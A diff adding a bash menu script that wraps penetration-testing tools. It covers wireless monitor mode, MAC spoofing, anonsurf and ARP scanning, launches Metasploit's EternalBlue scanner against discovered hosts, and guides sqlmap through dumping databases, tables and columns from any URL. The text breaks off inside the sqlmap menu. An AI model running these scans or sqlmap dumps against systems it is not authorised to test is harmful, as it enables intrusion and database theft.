@@ -1,0 +1,3609 @@
+#!/bin/bash
+
+
+#path for yalscript
+	LPATH="/root/yalscript"
+	export LPATH
+
+BACKL="0"	
+
+#ALFA SUPPORT SETTING
+	if [[ -f "$LPATH"/settings/alfa.txt ]]
+	then
+		read ALFA < "$LPATH"/settings/alfa.txt
+	else
+		ALFA="no"
+	fi
+	
+#setting custom color for logo
+	if [[ -f "$LPATH"/settings/logocolor.txt ]]
+	then
+		read COL < "$LPATH"/settings/logocolor.txt
+	else
+		COL="$BR"
+	fi	
+# Initializing colors
+# ref: https://gist.github.com/JBlond/2fea43a3049b38287e5e9cefc87b2124
+
+
+# light red
+LR="\e[0;31m"
+# bold red
+BR="\e[1;31m"
+# light green
+LG="\e[0;32m"
+# bold green
+BG="\e[1;32m"
+# light yellow
+LY="\e[0;33m"
+# bold yellow
+BY="\e[1;33m"
+# light blue
+LB="\e[0;34m"
+# bold blue
+BB="\e[1;34m"
+# light purple
+LP="\e[0;35m"
+# bold purple
+BP="\e[1;35m"
+#light gray 
+LGY="\e[0;37m"
+# color end
+CE="\e[0m"
+
+#color testing
+
+#echo -e "$LR YALS"
+#echo -e "$BR YALS"
+#echo -e "$LG YALS"
+#echo -e "$BG YALS"
+#echo -e "$LY YALS"
+#echo -e "$BY YALS"
+#echo -e "$LB YALS"
+#echo -e "$BB YALS"
+#echo -e "$LP YALS"
+#echo -e "$BP YALS"
+
+# Frequent String
+YNYES="("$BY"y"$CE"/"$BY"n"$CE")("$BY"Enter"$CE"=yes)"
+YNNO="("$BY"y"$CE"/"$BY"n"$CE")("$BY"Enter"$CE"=no)"
+YNONLY="("$BY"y"$CE"/"$BY"n"$CE")"
+PAKTGB="Press$BP any key$CE to go back"
+MM="Press m for Main Menu"
+PAKTC="Press$BP any key$CE to Continue"
+TNI=""$BR"Tool is not installed. To install it type '"$CE""$BY"install"$CE""$BR"'."$CE""
+#code to read from keyboard without return
+	READAK="read -n 1"
+#default MAC when starting monitor
+	DEFMAC="00:11:22:33:44:55"
+
+
+function dash_calc
+{
+	
+	size=${#TERMINALTITLE}
+	calc=$(( 65-size ))
+	calc=$(( calc/2 ))
+	numcalc=1
+	DASHESN="#"
+	while [ $numcalc != $calc ]
+	do
+		DASHESN=""$DASHESN"#"
+		numcalc=$(( numcalc+1 ))
+	done
+	echo -e "$DASHESN"$BR"$TERMINALTITLE"$CE"$DASHESN"
+}
+	
+	
+function banner
+{
+clear
+echo -e " "
+echo -e $BG  "\t\t"  " ██╗   ██╗    █████╗   $BR ██╗       ███████╗   "
+echo -e $BG  "\t\t"  " ╚██╗ ██╔╝   ██╔══██╗  $BR ██║       ██╔════╝   "
+echo -e $BG  "\t\t"  "  ╚████╔╝    ███████║  $BR ██║       ███████╗   "
+echo -e $BG  "\t\t"  "   ╚██╔╝     ██╔══██║  $BR ██║       ╚════██║   "
+echo -e $BG  "\t\t"  "    ██║      ██║  ██║  $BR ███████╗  ███████║   "            
+echo -e $BG  "\t\t"  "    ╚═╝      ╚═╝  ╚═╝  $BR ╚══════╝  ╚══════╝   "
+echo -e $BG  "\t\t"  "|----------Yet Another"$BR" Lazy Script----------|"
+echo -e "$CE"
+echo  "if) ifconfig          	l) Local IPs & gateways         |     CTF Tools     "
+echo  " 1) Enable wlan0      	d1) Disable wlan0               | recon) Basic Recon"
+echo  " 2) Enable wlan0mon   	d2) Disable wlan0mon            | steg)  Stegnography"
+echo  " 3) Change MAC        	d3) Restore original MAC        | hash)  Hash Identifier"  
+echo  " 4) Enable anonsurf   	d4) Disable anonsurf            | ci)    ciphers"
+echo  " 5) Anonsurf's status 	d5) Restart anonsurf            | brute) Bruteforcer"
+echo  " 6) View Public IP      wifi) Airgeddon [Automated]       "
+echo  " 7) View MAC            start) Start monitor mode         "
+echo  " 8) Tools               stop) Stop monitor mode            "
+echo  " 9) Metasploit          scan) Arp-scan network"
+echo  "10) pimpmykali          set) Social-Engineer Toolkit    | 0)Exit"
+}
+function check_wlans
+{
+	CC=$WLANN
+	WLANCHECKING=$(ifconfig | grep "$WLANN" )
+	#~ WLANCHECKING=$(ifconfig | awk -v c1="$CC" '$0 ~ c1 {print}')
+	CC=$WLANNM
+	WLANMCHECKING=$(ifconfig | grep "$WLANNM" )
+	#~ WLANMCHECKING=$(ifconfig | awk -v c1="$CC" '$0 ~ c1 {print}')
+}
+check_wlans	
+function set_interface_number
+{
+clear
+while true
+do
+echo -e "Enter the name of your wireless interface when in "$BR"managed"$CE" mode("$BY"Enter"$CE"=wlan0): "
+read MANAGED
+if [[ "$MANAGED" = "" ]]
+then
+	MANAGED="wlan0"
+fi
+echo -e "Enter the name of your wireless interface when in "$BR"monitor"$CE" mode("$BY"Enter"$CE"=wlan0mon): "
+read MONITOR
+if [[ "$MONITOR" = "" ]]
+then
+	MONITOR="wlan0mon"
+fi
+echo -e "Enter the name of your wired interface("$BY"Enter"$CE"="eth0"): "
+read WIRED
+if [[ "$WIRED" = "" ]]
+then
+	WIRED="eth0"
+fi
+	echo "$MANAGED" > "$LPATH"/wlan.txt
+	echo "$MONITOR" > "$LPATH"/wlanmon.txt
+	echo "$WIRED" > "$LPATH"/eth.txt
+	echo -e ""$BY"Done"$CE""
+	sleep 1
+	clear
+	echo -e ""$BB"If you want to change it, type "$CE""$BY"interface"$CE""$BB" any time"$CE""
+	sleep 3
+	echo -e "$PAKTC"
+	$READAK	
+	BACKL="1"
+	break
+done
+}
+WLANN=$(cat "$LPATH"/wlan.txt)
+WLANNM=$(cat "$LPATH"/wlanmon.txt)
+ETH=$(cat "$LPATH"/eth.txt)
+function interface_menu
+{
+	
+	echo -e "Your current wireless interface names are $WLANN and $WLANNM"
+	sleep 2
+	echo -e "Do you want to change you interface names?"$YNYES": "
+	read INAG
+	if [[ "$INAG" = "n" ]]
+	then
+		clear
+		echo -e "Then why did you come here? lol"
+		sleep 3
+		exec bash "$0"
+	else
+		clear
+		rm "$LPATH"/wlan.txt
+		rm "$LPATH"/wlanmon.txt
+		set_interface_number
+	fi
+}
+
+
+
+
+
+# function for running ifconfig command
+function IP_func
+{
+ifconfig
+echo -e "$PAKTGB"
+$READAK
+MainMenu
+}
+
+
+
+#Functions here
+
+function is_it_an_ip()
+{
+	IIA=$1
+	IIAI=${#IIA}
+	if [[ "$IIA" = "" ]]
+	then
+		echo -e ""$BR"Error 9. No parameteres passed"
+		sleep 2
+	else
+		if [[ "$IIAI" -le 15 && "$IIAI" -ge 7 ]]
+		then
+			echo 1
+		else
+			echo 0
+		fi
+	fi
+}
+
+function local_ips()
+{
+	clear
+	iffile=""$LPATH"/iftemp.txt"
+	#passing an interface if any
+	LF="$1"
+	GREPP=$(ifconfig)
+	if [[ "$LF" = "" ]]
+	then
+		echo -e ""$BB"Local IPs"$CE": "
+		TEST=$(echo "$GREPP" | grep "$ETH:")
+		n=0
+		if [[ $TEST != "" ]]
+		then
+			ifconfig "$ETH" > $iffile
+			LOCALETH=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			cho=$(is_it_an_ip $LOCALETH)
+			if [[ "$cho" = 1 ]]
+			then
+				echo -e ""$ETH" = "$BY"$LOCALETH"$CE""
+				n=1
+			fi
+		fi
+		TEST=$(echo "$GREPP" | grep "$WLANN:")
+		if [[ $TEST != "" ]]
+		then
+			ifconfig $WLANN > $iffile
+			LOCALMA=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			cho=$(is_it_an_ip $LOCALMA)
+			if [[ "$cho" = 1 ]]
+			then
+				echo -e "$WLANN = "$BY"$LOCALMA"$CE""
+				n=1
+			fi
+		fi
+		TEST=$(echo "$GREPP" | grep "$WLANNM:")
+		if [[ $TEST != "" ]]
+		then
+			ifconfig $WLANNM > $iffile
+			LOCALMO=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			cho=$(is_it_an_ip $LOCALMO)
+			if [[ "$cho" = 1 ]]
+			then
+				echo -e "$WLANNM = "$BY"$LOCALMO"$CE""
+				n=1
+			fi
+		fi
+		if [[ "$n" = 0 ]]
+		then
+			echo -e ""$BR"No known interfaces found available"$CE""
+		fi
+		echo -e ""
+		find_gateways
+	else
+		TEST=$(echo "$GREPP" | grep "$LF:")
+		if [[ $TEST != "" ]]
+		then
+			ifconfig $LF > $iffile
+			LOCALM=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			cho=$(is_it_an_ip $LOCALM)
+			if [[ "$cho" = 1 ]]
+			then
+				OUTPUT="$LOCALM"
+				echo -e "$OUTPUT"
+			fi
+		fi
+	fi
+}
+
+function give_ip_take_zero()
+{
+	#passing an ip
+	GI1="$1"
+	GI2="$2"
+	if [[ "$GI1" = "" ]]
+	then
+		echo -e ""$BR"Error 7. No parameters passed"$CE""
+		sleep 3
+	else
+		ip1=$(echo -e "$GI1" | cut -d '.' -f1)
+		ip2=$(echo -e "$GI1" | cut -d '.' -f2)
+		ip3=$(echo -e "$GI1" | cut -d '.' -f3)
+		if [[ "$GI2" = "" ]]
+		then
+			OUTPUT=""$ip1"."$ip2"."$ip3".0"
+		else
+			OUTPUT=""$ip1"."$ip2"."$ip3"."
+		fi
+			echo "$OUTPUT"
+	fi
+}
+
+
+function find_gateways()
+{
+	#example: find_gateways wlan0 interface
+	FG1="$1"
+	FG2="$2"
+	if [[ "$FG1" = "" ]]
+	then
+		echo -e ""$BB"Gateways"$CE": "
+		n=0
+		ethr=$(ifconfig | grep "$ETH")
+		if [[ "$ethr" != "" ]]
+		then
+			ethd=$(route -n | awk -v int1="$ETH" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+			chi=$(is_it_an_ip "$ethd")
+			if [[ "$ethd" != "" && "$chi" = 1 ]]
+			then
+				echo -e ""$ETH" = "$BY""$ethd""$CE""
+				n=1
+			fi
+		fi
+		wlanr=$(ifconfig | grep "$WLANN")
+		if [[ "$wlanr" != "" ]]
+		then
+			wland=$(route -n | awk -v int1="$WLANN" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+			chi=$(is_it_an_ip "$wland")
+			if [[ "$wland" != "" && "$chi" = 1 ]]
+			then
+				echo -e ""$WLANN" = "$BY""$wland""$CE""
+				n=1
+			fi
+		fi
+		wlanmr=$(ifconfig | grep "$WLANNM")
+		if [[ "$wlanmr" != "" ]]
+		then
+			wlanmd=$(route -n | awk -v int1="$WLANNM" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+			chi=$(is_it_an_ip "$wlanmd")
+			if [[ "$wlanmd" != "" && "$chi" = 1 ]]
+			then
+				echo -e ""$WLANNM" = "$BY""$wlanmd""$CE""
+				n=1
+			fi
+		fi
+		if [[ "$n" = 0 ]]
+		then
+			echo -e ""$BR"No known interfaces found available"$CE""
+		fi
+	else
+		if [[ "$FG2" = "interface" ]]
+		then
+			inttos=$(ifconfig | grep "$FG1")
+			if [[ "$inttos" != "" ]]
+			then
+				gate=$(route -n | awk -v int1="$FG1" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+				cho=$(is_it_an_ip "$gate")
+				if [[ "$cho" = 1 ]]
+				then
+					echo "$gate"
+				fi
+			else
+				echo 0
+			fi
+
+		fi		
+	fi
+}
+
+
+
+
+
+function enable_wlan
+{
+	clear
+	O4=0
+	echo -e "Enabling $WLANN..."
+	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
+	ifconfig $WLANN up &>/dev/null && echo -e ""$BY"Done"$CE"" && O4=1  || echo -e ""$BR"Error. I can't find your wireless adapter"$CE""
+}
+function disable_wlan
+{
+	clear
+	echo -e "Disabling $WLANN..."
+	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
+	ifconfig $WLANN down &>/dev/null && echo -e ""$BY"Done"$CE"" && O4=1 || echo -e ""$BR"Error. I can't find your wireless adapter."$CE""
+}
+
+
+function enable_wlanmon
+{		
+		clear
+		check_wlans
+		if [[ "$WLANCHECKING" = "" ]]
+		then
+			echo -e ""$BR"Error. Could find $WLANN interface."$CE""
+		else
+			echo -e "Enabling $WLANNM..."
+			echo -e "Killing services..."
+			(airmon-ng check kill &> /dev/null && echo -e "Done." ) || echo -e ""$BR"Error killing services"$BY""
+			echo -e "Starting monitor mode..."
+			(airmon-ng start $WLANN &>/dev/null && echo -e "Done" ) || echo -e "Error starting monitor mode."
+		fi
+}
+
+function disable_wlanmon
+{
+		clear
+		check_wlans
+		if [[ "$WLANMCHECKING" = "" ]]
+		then
+			echo -e ""$BR"Error. Could find $WLANNM interface."$CE""
+		else
+			stop_monitor
+		fi
+}
+function start_menu
+{
+	clear
+	O1=0
+	O2=0
+	O3=0
+	echo -e "Enabling $WLANNM..."
+	enable_wlan
+	echo -e "Killing services..."
+	airmon-ng check kill &> /dev/null && echo -e ""$BY"Done"$CE"" && O1=1
+	echo -e "Starting monitor mode..."
+	if [[ "$ALFA" = "yes" ]]
+	then
+		ifconfig $WLANN down
+		iwconfig $WLANN mode monitor &> /dev/null && echo -e ""$BY"Done"$CE"" && O2=1
+		ifconfig $WLANN up
+	else
+		airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$BY"Done"$CE"" && O2=1
+	fi
+	
+	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 && "$O4" = 1 ]]
+	then
+		BACKL=1
+	fi
+}
+
+
+
+function stop_monitor
+{	
+	clear
+	echo -e "Disabling $WLANNM..."
+	echo -e "Stopping monitor mode..."
+	if [[ "$ALFA" = "yes" ]]
+	then
+		A1=0
+		A2=0
+		A3=0
+		ifconfig $WLANN down && A1=1
+		iwconfig $WLANN mode managed && A2=1
+		ifconfig $WLANN up && A3=1
+		if [[ "$A1" = 1 && "$A2" = 1 && "$A3" = 1 ]]
+		then
+			echo -e ""$BY"Done"$CE"" && O2=1
+		else
+			echo -e ""$BR"Error stoping monitor mode."$CE""
+		fi
+	else
+		airmon-ng stop $WLANNM &>/dev/null && echo -e ""$BY"Done"$CE"" && O2=1 || echo -e ""$BR"Error stoping monitor mode."$CE""
+	fi
+	echo -e "Starting network-manager service..."
+	systemctl restart NetworkManager && echo -e ""$BY"Done"$CE"" && O3=1 || echo -e ""$BR"Error starting network-manager service"$CE""
+}
+function ip_scan()
+{
+	
+while true
+do
+	#passing interface
+	IPF=$1
+	#passing mode if any  (1=choosable   2=only rescanable)
+	#Mode 1 is for choosing and returning the IP.
+	#Mode 2 is for echoing the scan, not choosing.
+	MODE=$2
+	export IPF
+	if [[ "$IPF" = "" ]]
+	then
+		echo -e ""$BR"Error 6. No parameters passed"$CE""
+		sleep 3
+		break
+	fi
+	#getting local ip
+	LLL=$(local_ips $IPF)
+	#getting zero ip
+	ZERO=$(give_ip_take_zero $LLL)
+	export ZERO
+	echo -e ""$BB"Scanning, please wait..."$CE""
+	tempfile="/root/yalscript/tempscan.txt"
+	#xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile"
+	gnome-terminal -- arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile
+	clear
+	######
+	T1=$(cat $tempfile | grep "Ending arp-scan")
+	if [[ "$T1" = "" ]]
+	then
+		lines=$(cat $tempfile | awk 'END{print NR}')
+		hosts=$((lines-3))
+	else
+		lines=$(cat $tempfile | awk 'END{print NR}')
+		hosts=$((lines-5))
+	fi
+	hostsbackup="$hosts"
+		if [[ "$hosts" -le 0 ]]
+		then
+			echo -e ""$BR"No hosts found"$CE""
+			sleep 1
+		else
+			echo -e ""$BB"Host(s) found:"$CE""
+			##########
+			n=1
+			n2=2
+			while [[ "$n" -le "$hosts" ]]
+			do
+				#Hosts start from line 3
+				n1=$((n2+n))
+				host[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1 && $0 !~ /DUP:/){print $1}}')
+				if [[ "${host[$n]}" = "" ]]
+				then
+					#sometimes there are duplicate IPs.This should remove them.
+					n2=$((n2+1))
+					hosts=$((hosts-1))
+					#~ n=$((n+1))
+					continue
+				fi
+				size=${#host[$n]}
+				sized=$((20-size))
+				SPACESN=" "
+				numcalc=1
+				while [ $numcalc != $sized ]
+				do
+					SPACESN=""${SPACESN}" "
+					numcalc=$(( numcalc+1 ))
+				done
+				mi[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $2}}')
+				im[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $3}}')
+				if [[ "$MODE" = 1 ]]
+				then
+					echo -e ""$BY" $n"$CE") "${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
+				else
+					echo -e ""${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
+				fi
+				n=$((n+1))
+			done
+			if [[ "$MODE" = 1 ]]
+			then
+				echo -e ""$BY" r"$CE") Rescan"
+				echo -e ""$BY" b"$CE") Go back"
+				echo -e "Choose: "
+				read sch
+				if [[ "$sch" = "b" ]]
+				then
+					echo ""
+				elif [[ "$sch" = "r" ]]
+				then
+					clear
+					continue
+				elif [[ "$sch" -le "$hosts" && "$sch" -ge 1 ]]
+				then
+					OUTPUT="${host[$sch]}"
+					export OUTPUT
+					#~ echo "$OUTPUT"
+				fi
+			else
+				echo -e ""$BY" e"$CE") Check eternalblue exploit on IPs"
+				echo -e ""$BY" r"$CE") Rescan"
+				echo -e "Press "$BY"any other key"$CE" to go back"
+				read -n 1 ko
+				if [[ "$ko" = "r" ]]
+				then
+					clear
+					continue
+				elif [[ "$ko" = "e" ]]
+				then
+					n=1
+					totalhosts=""
+					while [[ "$n" -le "$hostsbackup" ]]
+					do
+						totalhosts=""$totalhosts" "${host["$n"]}""
+						n=$((n+1))
+					done
+					clear
+					if [[ "$totalhosts" = "" || "$totalhosts" = " " ]]
+					then
+						echo -e ""$BR"No hosts found to check"$CE""
+						sleep 2
+						continue
+					fi
+					echo -e ""$BB"RHOSTS"$CE" <- "$totalhosts""
+					sleep 2
+					if [[ ! -d "$LPATH"/rce ]]
+					then
+						mkdir	"$LPATH"/rce
+					fi
+					echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
+					echo "set RHOSTS "$totalhosts"" >> "$LPATH"/rce/eternalbluerc.rc
+					echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
+					echo -e ""$BB"Launching msfconsole. Please wait..."$CE""
+					msfconsole -r "$LPATH"/rce/eternalbluerc.rc
+				else
+					BACKL=1
+					break
+				fi
+			fi
+			##########
+		fi
+		break
+	#~ fi
+	######
+done
+
+}
+function sqlmap_menu
+{
+file2="/root/yalscript/sqltemp2"
+file3="/root/yalscript/sqltemp3"
+file4="/root/yalscript/sqltemp34"
+while true
+do
+	clear
+	TERMINALTITLE="SQLMAP"
+	dash_calc
+	printf '\033]2;SQLMAP\a'
+	if [[ "$URL" = "" ]]
+	then
+		URL=""$BR"None"$CE""
+		urls=0
+	fi
+	if [[ "$FDBS" = "" ]]
+	then
+		FDBS=""$BR"None"$CE""
+		fdbss=0
+	fi
+	if [[ "$SD" = "" ]]
+	then
+		SD=""$BR"None"$CE""
+		sds=0
+	fi
+	if [[ "$TB" = "" ]]
+	then
+		TB=""$BR"None"$CE""
+		tbs=0
+	fi
+	if [[ "$ST" = "" ]]
+	then
+		ST=""$BR"None"$CE""
+		sts=0
+	fi
+	if [[ "$CL" = "" ]]
+	then
+		CL=""$BR"None"$CE""
+		cls=0
+	fi
+	if [[ "$SC" = "" ]]
+	then
+		SC=""$BR"None"$CE""
+		scs=0
+	fi
+	echo -e ""$BY" 1"$CE") URL                         Current:"$BY"$URL"$CE""
+	if [[ "$urls" = 0 ]]
+	then
+		echo -e ""$BR" 2"$CE") Fetch databases             Current:$FDBS"
+	else
+		echo -e ""$BY" 2"$CE") Fetch databases             Current:$FDBS"
+	fi
+	if [[ "$fdbss" = 0 ]]
+	then
+		echo -e ""$BR" 3"$CE") Select database             Current:"$BY"$SD"$CE""
+	else
+		echo -e ""$BY" 3"$CE") Select database             Current:"$BY"$SD"$CE""
+	fi
+	if [[ "$sds" = 0 ]]
+	then
+		echo -e ""$BR" 4"$CE") Fetch tables                Current:"$BY"$TB"$CE""
+	else
+		echo -e ""$BY" 4"$CE") Fetch tables                Current:"$BY"$TB"$CE""
+	fi
+	if [[ "$tbs" = 0 ]]
+	then
+		echo -e ""$BR" 5"$CE") Select table                Current:"$BY"$ST"$CE""
+	else
+		echo -e ""$BY" 5"$CE") Select table                Current:"$BY"$ST"$CE""
+	fi
+	if [[ "$sts" = 0 ]]
+	then
+		echo -e ""$BR" 6"$CE") Fetch columns               Current:"$BY"$CL"$CE""
+	else
+		echo -e ""$BY" 6"$CE") Fetch columns               Current:"$BY"$CL"$CE""
+	fi
+	if [[ "$cls" = 0 ]]
+	then
+		echo -e ""$BR" 7"$CE") Select columns              Current:"$BY"$SC"$CE""
+	else
+		echo -e ""$BY" 7"$CE") Select columns              Current:"$BY"$SC"$CE""
+	fi
+	if [[ "$scs" = 0 ]]
+	then
+		echo -e ""$BR" s"$CE") Start"
+	else
+		echo -e ""$BY" s"$CE") Start"
+	fi
+	echo -e ""$BY" b"$CE") Go back"
+	echo -e "Choose: "
+	read SQ
+	clear
+	if [[ "$SQ" = 1 ]]
+	then
+		echo -n "URL: "
+		read URLL
+		if [[ "$URLL" != "" || "$URLL" = "b" ]]
+		then
+			URL="$URLL"
+			urls=1
+				##Clearing nexts
+				FDBS=""
+				fdbss=0
+				SD=""
+				sds=0
+				TB=""
+				tbs=0
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+		fi
+	elif [[ "$SQ" = "s" ]]
+	then
+		if [[ "$scs" = 0 ]]
+		then
+			echo -e ""$BR"No columns selected"$CE""
+			sleep 2
+			break
+		fi
+		#~ export URL
+		#~ export SD
+		#~ export ST
+		#~ export SC
+		sqlmap -u "$URL" -D "$SD" -T "$ST" -C "$SC" --dump | tee "$file4"
+		echo -e ""
+		echo -e ""$BY"A log file has been created on "$file4". Copy it before it gets overwritten"$CE""
+		echo -e ""
+		echo -e "$PAKTGB"
+		$READAK
+	elif [[ "$SQ" = "b" ]]
+	then
+		break
+	elif [[ "$SQ" = 00 ]]
+	then
+		exec bash $0
+	elif [[ "$SQ" = 7 ]]
+	then
+		if [[ "$cls" = 0 ]]
+		then
+			echo -e ""$BR"Columns not fetched"$CE""
+			sleep 2
+			break
+		fi
+		n10=1
+		CCO1="$CO1"
+		while [[ "$n10" -le "$NCO" ]]
+		do
+			cl[$n10]=$(cat "$file3" | awk -v n12="$CCO1" '{if(NR==n12)print}' | cut -d ' ' -f2)
+			CCO1=$((CCO1+1))
+			n10=$((n10+1))
+		done
+		while true
+		do
+			clear
+			echo -e ""$BS"Columns: "$CE""
+			v=1
+			while [[ "$v" -le "$NCO" ]]
+			do
+				if [[ "${selc[$v]}" = 1 ]]
+				then
+					SSC="$BY"
+				else
+					SSC="$WS"
+				fi
+				if [[ "$v" -le 9 ]]
+				then
+					echo -e ""$BY"  $v"$CE") "$SSC"${cl[$v]}"$CE""
+				elif [[ "$v" -le 99 ]]
+				then
+					echo -e ""$BY" $v"$CE") "$SSC"${cl[$v]}"$CE""
+				else
+					echo -e ""$BY"$v"$CE") "$SSC"${cl[$v]}"$CE""
+				fi
+				v=$((v+1))
+			done
+			echo -e ""$BY" d"$CE") Deselect all"
+			echo -e ""$BY" s"$CE") Save selection"
+			echo -e ""$BY" b"$CE") Go back"
+			echo -e "Choose: "
+			read COCH
+			clear
+			if [[ "$COCH" = "b" || "$COCH" = "back" ]]
+			then
+				break
+			elif [[ "$COCH" = "s" ]] 
+			then
+				v2=1
+				SC=""
+				while [[ "$v2" -le "$NCO" ]]
+				do
+					if [[ "${selc[$v2]}" = 1 ]]
+					then
+						if [[ "$SC" = "" ]]
+						then
+							SC="${cl[$v2]}"
+						else
+							SC=""$SC","${cl[$v2]}""
+						fi
+					fi
+					v2=$((v2+1))
+				done
+				if [[ "$SC" = "" ]]
+				then
+					echo -e ""$BR"Nothing selected"$CE""
+					ssc=0
+					sleep 2
+				else
+					ssc=1
+				fi
+				break
+			elif [[ "$COCH" = "d" ]] 
+			then
+				v1=1
+				while [[ "$v1" -le "$NCO" ]]
+				do
+					selc[$v1]=""
+					v1=$((v1+1))
+				done
+			elif [[ "$COCH" -le 0 || "$COCH" -gt "$NCO" ]] 
+			then
+				echo -e ""$BR"Wrong choice"$CE""
+				sleep 2
+				continue
+			else
+				if [[ "${selc[$COCH]}" != 1 ]]
+				then
+					selc[$COCH]=1
+				else
+					selc[$COCH]=""
+				fi
+			fi
+		done
+	elif [[ "$SQ" = 6 ]]
+	then
+		while true
+		do
+			if [[ "$sts" = 0 ]]
+			then
+				echo -e ""$BR"Table not selected"$CE""
+				sleep 2
+				break
+			fi
+			sqlmap -u "$URL" -D "$SD" -T "$ST" --columns <<< $'\n\n\n\n\n\n\n\n\n\n' | tee $file3
+			##finding columns
+			CO=$(cat "$file3" | awk '{if(/+----/)print NR}')
+			CO1=$(echo $CO | cut -d ' ' -f2)
+			CO1=$((CO1+1))
+			CO2=$(echo $CO | cut -d ' ' -f3)
+			CO2=$((CO2-1))
+			NCO=$((CO2-CO1))
+			if [[ "$NCO" -le 0 ]]
+			then
+				echo -e ""$BR"Error 24. No columns found automatically"$CE""
+				sleep 2
+				cls=0
+				continue
+			else
+				if [[ "$NCO" = 1 ]]
+				then
+					echo -e ""$BY"1 column found!"$CE""
+					sleep 2
+				else
+					echo -e ""$BY""$NCO" columns found!"$CE""
+					sleep 2
+				fi
+				CL="Done"
+				cls=1
+				break
+			fi
+		done
+	elif [[ "$SQ" = 5 ]]
+	then
+		while true
+		do
+			if [[ "$tbs" = 0 ]]
+			then
+				echo -e ""$BR"Tables not fetched"$CE""
+				sleep 2
+				break
+			fi
+			echo -e ""$BS"Tables: "$CE""
+			n9=1
+			CC1="$C1"
+			while [[ "$n9" -le "$NTB" ]]
+			do
+				tb[$n9]=$(cat "$file2" | awk -v n11="$CC1" '{if(NR==n11)print}' | cut -d ' ' -f2)
+				if [[ "$n9" -le 9 ]]
+				then
+					echo -e ""$BY"  $n9"$CE") ${tb[$n9]}"
+				elif [[ "$n9" -le 99 ]]
+				then
+					echo -e ""$BY" $n9"$CE") ${tb[$n9]}"
+				else
+					echo -e ""$BY"$n9"$CE") ${tb[$n9]}"
+				fi
+				CC1=$((CC1+1))
+				n9=$((n9+1))
+			done
+			echo -e ""$BY" b"$CE") Go back"
+			echo -e "Choose: "
+			read TCH
+			if [[ "$TCH" = "b" || "$TCH" = "back" ]]
+			then
+				break
+			elif [[ "$TCH" -le 0 || "$TCH" -gt "$NTB" ]] 
+			then
+				echo -e ""$BR"Wrong choice"$CE""
+				sleep 2
+				continue
+			else
+				ST="${tb[$TCH]}"
+				sts=1
+				##Clearing nexts
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+				break
+			fi
+		done
+	elif [[ "$SQ" = 4 ]]
+	then
+		if [[ "$sds" = 0 ]]
+		then
+			echo -e ""$BR"Databases not selected"$CE""
+			sleep 2
+			continue
+		fi
+		sqlmap -u "$URL" -D "$SD" --tables <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file2"
+		##finding tables
+		C=$(cat "$file2" | awk '{if(/+----/)print NR}')
+		C1=$(echo $C | cut -d ' ' -f1)
+		C1=$((C1+1))
+		C2=$(echo $C | cut -d ' ' -f2)
+		C2=$((C2-1))
+		NTB=$((C2-C1))
+		if [[ "$NTB" -le 0 ]]
+		then
+			echo -e ""$BR"Error 23. No tables found automatically"$CE""
+			sleep 2
+			tbs=0
+			continue
+		else
+			if [[ "$NTB" = 1 ]]
+			then
+				echo -e ""$BY"1 table found!"$CE""
+				sleep 2
+			else
+				echo -e ""$BY""$NTB" tables found!"$CE""
+				sleep 2
+			fi
+			TB="Done"
+			tbs=1
+				##Clearing nexts
+				ST=""
+				sts=0
+				cls=0
+				CL=""
+				scs=0
+				SC=""
+		fi
+	elif [[ "$SQ" = 3 ]]
+	then
+		while true
+		do
+			if [[ "$fdbss" = 0 ]]
+			then
+				echo -e ""$BR"Databases not fetched"$CE""
+				sleep 2
+				continue
+			fi
+			echo -e ""$BS"Databases: "$CE""
+			n8=1
+			while [[ "$n8" -le "$NDB" ]]
+			do
+				if [[ "$n8" -le 9 ]]
+				then
+					echo -e ""$BY"  "$n8""$CE") ${db[$n8]}"
+				elif [[ "$n8" -le 99 ]]
+				then
+					echo -e ""$BY" "$n8""$CE") ${db[$n8]}"
+				else
+					echo -e ""$BY""$n8""$CE") ${db[$n8]}"
+				fi
+				n8=$((n8+1))
+			done
+			echo -e ""$BY" b"$CE") Go back"
+			echo -e "Choose: "
+			read DCH
+			clear
+			if [[ "$DCH" = "b" || "$DCH" = "back" ]]
+			then
+				break
+			fi
+			if [[ "$DCH" -lt 0 || "$DCH" -gt "$NDB" ]]
+			then
+				echo -e ""$BR"Wrong choice"$CE""
+				sleep 2
+			else
+				SD="${db[$DCH]}"
+				sds=1
+					##Clearing nexts
+					TB=""
+					tbs=0
+					ST=""
+					sts=0
+					cls=0
+					CL=""
+					scs=0
+					SC=""
+				break
+			fi	
+		done
+	elif [[ "$SQ" = 2 ]]
+	then
+		if [[ "$urls" != 1 ]]
+		then
+			echo -e ""$BR"URL not selected"$CE""
+			sleep 2
+			continue
+		fi
+		file="/root/yalscript/sqltemp"
+		sqlmap -u "$URL" --dbs <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file"
+		##Find the line
+		CHECK=$(cat "$file" | grep "available databases ")
+		if [[ "$CHECK" = "" ]]
+		then
